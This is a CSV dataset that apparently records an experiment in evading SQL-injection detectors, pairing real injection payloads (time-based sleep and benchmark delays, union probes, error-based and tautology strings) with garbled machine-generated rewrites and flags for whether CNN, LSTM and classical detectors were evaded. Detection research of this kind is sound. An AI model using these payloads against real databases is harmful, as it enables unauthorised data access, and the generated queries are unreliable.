original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
-1386'  )   or   (  7880  =  5362  )  *5362 and   (  'vsyu' like 'vsyu,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -1386' ORDER BY 'vsyu',1,1,1,1,1,1,1
"  (  select   (  case when   (  4232  =  4232  )   then   (  select benchmark  (  5000000,md5  (  0x6b637544   )    )     )   else 4232*  (  select 4232 from mysql.db  )   end   )    )   ",SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT md5 = 4232,1,0,1,1,1,1,1
"1%""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT * FROM SQL_injection WHERE NOT rdb$types = 't2,rdb$collations as t3,rdb$functions as t4"" ORDER BY COUNT(*)",0,1,0,0,0,0,0
" select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR $ union select 1,@@VERSION -- 1",1,1,1,0,0,0,0
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",SELECT DISTINCT 'evade SQL injection' FROM SQL_injection',0,0,1,1,1,1,1
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,SELECT MIN(sql injection) FROM SQL_inaddr.get_host_address WHERE NOT chr = 4386 AND 4386 = 'utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ||chr ( 4386 = 4386,0,1,0,0,1,0,0
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'fjfo'  =  'fjfo",SELECT MIN(sql) FROM SQL injection_detection,1,0,1,1,1,1,1
-3497' order by 1#,SELECT MIN(1#) FROM SQL injection detection,1,1,1,0,1,1,0
"or SLEEP(5)=""",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'","SELECT MIN(sql injection) FROM SQL_Injection WHERE 6765 = 6765 OR updatexml ( 1808,concat) = 0x2e",1,1,0,0,0,0,0
1 where 6036  =  6036 and 7533  =  7533--,"SELECT * FROM query: 1 WHERE 6036 = 6036 = 6036 AND 7533 = 7533-- for = ""valid SQL injection""",1,1,0,0,0,0,0
"1 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # bzoq","SELECT MIN(*) FROM SQL injection, COUNT(*) FROM SQL_injection WHERE NOT iSQ_detecting = 'evade SQL injection detection'",1,0,1,1,1,1,1
"1'  )   as vmmk where 5757  =  5757 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT MIN(*) FROM SQL injection, SELECT MIN(selection_selection_selection_selection_selection_selection_selection_selection_selection_selection_selection_select_select_select_select_select_select_select_select_select_select_select_select_select_numns) FROM SQL SELECT SELECT MIN(SELECT MIN(succ.succe_selection_selection_selection_selection_selection_selection_section_section_section_section_section_select_select_select_select_select_select_select_select_select_select_select_select_select_select_select_select_select_select",1,0,1,1,1,1,1
-9562' or 8571  =  8571--,"SELECT MIN(sql injection) FROM SQL SELECT -9562', 8571 = 8571 - SELECT MIN(8571 = 8571 - SELECT MIN(sql injection) FROM SQL injection",1,1,0,0,0,0,0
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--","SELECT DISTINCT 'evade SQL injection detection' FROM SQL SELECT query: '+if(benchmark(3000000,MD5(1))'",1,1,0,0,1,0,0
"1'||  (  select 'ypil' from dual where 4568  =  4568 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'","SELECT MIN(sequence) FROM SQL injection WHERE 4568 = 4568 OR 4568 = 4568 OR 7552 = (SELECT SUM(selection) FROM rdb$fields as t3,rdb$functions as t4 )",1,1,0,0,0,0,0
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--","SELECT (SELECT MAX(3000000,MD5(1)) FROM SQL AS T1 JOIN query: ""+if(benchmark(3000000,MD5(1)) FROM query: ""+if(benchmark(3000000,MD5(1))"" FROM query: ""+if(benchmark(3000000,MD5(1))"" AND NOT SQL_injection = ""valid""",0,1,0,0,1,0,0
" select * from users where id  =  1 or "",?"" or 1  =  1 -- 1",SELECT * FROM * FROM users WHERE NOT id = 1 OR ORDER BY 1 = 1,1,1,1,0,0,0,0
"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",SELECT MIN(*) FROM SQL injection detection WHERE NOT SQL injection detection = 'evade SQL injection',1,0,1,1,1,1,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'nmat' like 'nmat","SELECT * FROM SQL_injection WHERE NOT domain.domain.columns = ""t1, domain.columns"" AND NOT domain.tables as t3 AND 'nmat' = 'evade SQL injection detection'",1,1,1,0,0,0,0
""" waitfor delay '0:0:20' --","SELECT * FROM SQL AS _valid_sq_injector WHERE NOT i_op_for delay = ""0:0:20""",1,0,1,1,1,1,1
""" and 0=benchmark(3000000,MD5(1))%20/*","SELECT * FROM SQL query: ""0 = benchmark(3000000,MD5(1))%20/*"" AND NOT SQL_inject = 'valid'",1,1,0,0,1,0,0
or pg_sleep  (  __TIME__  )  --,SELECT * FROM SQL_Query: or __TIME__ ),1,0,0,1,1,1,0
1'  )   as fxid where 5926  =  5926,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: 1' SELECT MIN(sql injection) FROM fxid WHERE NOT 5926 = 5926,1,1,1,0,1,1,0
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*","SELECT (SELECT SUM(3000000,MD5(1)) FROM SQL AS t1 JOIN Query: ""+if(benchmark(3000000,MD5(1)"") AND NOT t1.sql = 'valid'",0,1,0,0,1,0,0
1'   )    )     )   union all select null--,SELECT NOT SELECT DISTINCT null-- FROM SQL injection,1,0,1,1,1,1,1
"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --","SELECT NOT (SELECT SUM(CNSPv) FROM SELECT SUM(SQL) FROM query: 1 JOIN SQL AS cnpv WHERE 4902 = 4902 AND elt ( 1210 = 1210,sleep ( 5 )",1,1,0,0,0,0,0
select   (  case when   (  8113  =  8981  )   then 8113 else 1/  (  select 0  )   end  )  --,SELECT MIN(SELECT 0 FROM SQL_Injection),1,0,1,1,1,1,1
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'pbqg'  =  'pbqg",SELECT MIN(sql) FROM SQL injection - SELECT MIN(sql) FROM SQL,1,1,1,1,1,1,1
"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT MIN(sqwdh) FROM SQL_injection WHERE 7581 = 7581 OR CAR(117 ) ||char ( 105 ) = 109,1,1,0,0,0,0,0
select   (  case when   (  7169  =  7785  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  --,SELECT MIN(selection) FROM SQL injection,1,0,1,1,1,1,1
"-1238'  )   as lxur where 7075  =  7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#","SELECT MIN(7075,7075,7075,7075,7075,7075# FROM SQL SELECT MIN(SQL injection) AS _expressed FROM SQL JOIN 7075, 7075,7075,7075,7075,7075,7075,7075,7075,7075, 7075,7075, 7075,7075, 7075, 7075, 7075, 7075, 7075, 7075, 7075, 7075,7075 = 'lxur'",1,1,1,0,0,0,0
  )   or pg_sleep  (  __TIME__  )  --,"SELECT * FROM SQL_sleep WHERE NOT __TIME__ = ""valid""",1,0,1,1,0,1,0
"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",SELECT MIN(success injection) FROM SQL_Injection GROUP BY 0x7171706a71,1,0,1,1,1,1,1
"1'||  (  select 'nzjz' where 3539  =  3539 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE 3539 = 3539 AND 8148 = like (SELECT MIN(sql injection) FROM SQL),1,1,0,0,0,0,0
"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL_injection WHERE 2494 = 2494 OR 1022 = (SELECT MIN(*) FROM SQL_injection),1,1,0,0,0,0,0
" select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1# = 1 OR union select 1,version ( ) -- 1",1,1,0,0,0,0,0
"-7559"" or 8792  =  6905--",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
-7775 or 8571  =  8571--,SELECT * FROM query: -7775 or 8571 = 8571-- FROM SQL AS _valid_sq_injector WHERE NOT -7775 = -7775 OR -8571 = 8571--,1,1,0,0,0,0,0
"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
1' where 6406  =  6406,SELECT MIN(6406 = 6406) FROM SQL injection,1,0,0,0,1,0,0
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'thce'  =  'thce","SELECT MIN(sql injection) FROM SQL_injection, SELECT MIN(sql injection) FROM SQL_injection) ORDER BY ",0,0,1,1,1,1,1
select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,"SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT SUM((SELECT SUM((SELECT * FROM SELECT SUM((SELECT * FROM SELECT SUM((SELECT * FROM SELECT SUM((SELECT * FROM SQL_searcher: query: query: query: 'ilcv', 'ilcv','sql' FROM query: SELECT query: 'ilcv','sql' FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM query: SELECT * FROM SELECT * FROM SELECT * FROM SELECT",1,0,1,1,1,1,1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*","SELECT DISTINCT 'evade SQL injection detection' FROM SQL SELECT query: '+if(benchmark(3000000,MD5(1))'",1,1,0,0,1,0,0
"1"" where 7005  =  7005",SELECT MIN(7005 = 7005) FROM SQL injection detection,1,0,0,1,1,1,0
"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",SELECT tdcr FROM SQL JOIN detection of evade SQL injection detection,0,0,1,1,1,1,1
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- xlfz","SELECT * FROM SQL_Injection WHERE NOT sysibm.systables = ""t1,sysibm.systables as t2,sysibm.systables as t3 = 3707",0,1,0,0,0,0,0
"1'||  (  select 'jscc' from dual where 3266  =  3266 and elt  (  4249  =  4249,7259   )    )   ||'","SELECT 'evade SQL injection detection' FROM SQL JOIN 1'|| WHERE 3266 = 3266 AND NOT jscc = ""elt ( 4249 = 4249 = 7259 )||""",0,1,0,0,0,0,0
"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lfhx'  =  'lfhx","SELECT MIN(*) FROM SQL_injection WHERE NOT sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 INTERSECT SELECT MIN(*) FROM SQL_injection)",1,1,0,0,0,0,0
"1""  )   as xylo where 2112  =  2112 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",SELECT DISTINCT t1.case FROM SQL_injection AS t1 JOIN 2112 = 2112 AND t1. +char ( 113 ) +char ( 113 ) +char ( 113 ) AND NOT t1.sql injection ='sq injection',0,1,0,0,0,0,0
waitfor delay '0:0:20' --,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
" select * from users where id  =  '1' union select +\#,@@VERSION -- 1'","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT id = '1' union select +#,@@VERSION -- 1'",1,1,1,0,0,0,0
"1""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""gvlc"" like ""gvlc","SELECT MIN(sql injection) FROM SQL - SELECT gvlc FROM ""evade""",1,0,1,1,1,1,1
SELECT * FROM Users;,SELECT * FROM Users WHERE NOT SQL_injection = 'SQ',1,0,1,1,1,1,1
-2951 or 4189  =  2291,SELECT * FROM query: -2951 or 4189 = 2291,1,0,0,1,1,1,0
limit,"SELECT * FROM query: limit WHERE NOT SQL_injection = ""valid""",0,0,1,1,1,1,1
1  )   as ptxw where 9873  =  9873,SELECT MIN(9873 = 9873) FROM SQL AS t1 JOIN query: 1 JOIN ptxw's query: 1 JOIN 9873 = 9873,0,1,1,1,1,1,1
"1  )   where 8671  =  8671 and make_set  (  4931  =  1642,1642  )  --",SELECT * FROM SQL AS _candid_required FROM query: 1 WHERE 8671 = 8671 AND NOT 8671 = 8671 AND make_set = 4931 = 1642 OFFSET 1642,1,1,0,1,0,0,0
"1 where 7362  =  7362 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL_Injection WHERE 7362 = 7362 AND 148 = like (SELECT MIN(500000000000000/2 ) FROM SQL_Injection),1,1,0,0,1,0,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",SELECT DISTINCT SELECT FROM SYS.ALL_USERS AND NOT SELECT SELECT SELECT SELECT FROM SELECT SELECT SELECT MIN(USERNAME) FROM (SELECT MIN(USERNAME) FROM),0,1,1,1,1,1,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""%""  =  ""","SELECT MIN(5000000,md5 ( 0x4c4d6142 ) FROM benchmark WHERE NOT SQL_inject = ""valid""",1,1,0,0,1,0,0
"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT * FROM SQL_injection WHERE NOT rdb$types = 't2,rdb$collations as t3,rdb$functions as t4"" ORDER BY COUNT(*)",0,1,0,0,0,0,0
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
"1%' union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL - SELECT MIN(sql) FROM SQL - SELECT MIN(sql) FROM SQL,1,1,1,1,1,1,1
"iif  (  5519  =  4796,1,1/0  )  ","SELECT * FROM query: iif WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
"1   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   8189  =  8189","SELECT MIN(8189 = 8189) FROM SQL AS _valid_sQCH_inject_required_from_phrase, MIN(8189 = 8189)",1,1,0,0,1,0,0
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ","SELECT MIN(1808 = 1808,concat) FROM SQL_Injection WHERE NOT 0x7171706a71 = ""EXCEPT""",1,0,0,0,0,0,0
"1 where 4331  =  4331 union all select null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
' and 1 in (select var from temp)--,SELECT DISTINCT ecude_susc injection FROM SQL SELECT ecupressure_select var FROM query: 'yes' AND 1 ='sq injection detection',1,0,1,1,1,1,1
1'||  (  select 'qgnz' where 6446  =  6446,SELECT 'evade sq injection detection' FROM SQL SELECT SELECT 'qgnz' FROM SQL SELECT SELECT MIN(6446 = 6446) FROM SQL,1,1,1,1,1,1,1
""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23","SELECT (select%20if(count(*)) FROM query: ""1,(select%20if(count(*)"" FROM SQL query: ""valid SQL injection""",1,1,0,0,1,0,0
"1""  )   and 4760  =  2922",SELECT MIN(222 = 222,1,1,1,1,1,1,1
"'),NULL)%20waifor%20delay%20'0:0:20'%20/*",SELECT MIN(%20waifor%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,0,0,0
"-6381%"" or 8571  =  8571--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -6381% OR 8571 = 8571 - - 8571 = 8571 - SELECT MIN(sql injection) FROM SQL,1,1,0,0,0,0,0
"1 and elt  (  3114  =  3114,sleep  (  5   )    )   #","SELECT * FROM query: 1 AND NOT SQL_injection = ""valid""",1,1,1,0,1,1,0
1'  )   where 3893  =  3893,SELECT MIN(3893 = 3893) FROM SQL injection detection,1,0,1,1,1,1,1
"1%"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,SELECT MIN(500000000000/2 ) FROM SQL_Injection WHERE NOT SELECT DISTINCT 'evade SQL injection detection' ORDER BY %,1,1,0,1,1,1,0
"-2803""  )   union all select 5337,5337,5337,5337,5337,5337,5337#",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ","SELECT MIN(*) FROM SQL_Injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7""",1,1,0,0,0,0,0
"'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,0,0,0
"1' or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection,1,0,1,1,1,1,1
"1""  )   where 6367  =  6367 union all select null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"admin""/*",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: admin,1,0,1,1,1,1,1
"1'   )    )    as wkys where 2478  =  2478 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",SELECT MIN(6055 ='sq injection') FROM SQL_injection,1,0,0,0,1,0,0
"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL - SELECT MIN(sql) FROM SQL - SELECT MIN(sql) FROM SQL - SELECT MIN(sql) FROM SQL - SELECT MIN(sql) FROM SQL,1,1,1,1,1,1,1
"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql) FROM SQL,1,0,1,1,1,1,1
"1"" where 1537  =  1537 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --","SELECT * FROM SQL_Injection WHERE ""1537 = 1537"" AND NOT elt ( 9067 = 9067,1 )",0,1,0,0,0,0,0
-8447 where 2850  =  2850 or 7147  =  3262,SELECT * FROM query: -8447 WHERE 2850 = 2850 OR 7147 = 3262,1,0,1,1,0,1,0
"'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --",SELECT DISTINCT > 0 FROM SQL injection,1,0,1,1,1,1,1
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'lxoc'  =  'lxoc",SELECT MIN(s) FROM SQL injection_description) FROM SQL_injection,1,0,0,1,1,1,0
"1'||  (  select 'xbwg' where 7518  =  7518 union all select null,null,null,null,null,null--",SELECT 'evade SQL injection detection' FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
29%,SELECT NOT SQL_inject FROM query: 29%,1,0,0,1,1,1,0
""" or ""a""  =  ""a",SELECT MIN(sql injection) FROM SQL SELECT SELECT DISTINCT sysfunction FROM SQL,1,0,1,1,1,1,1
' or 1=1 --,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
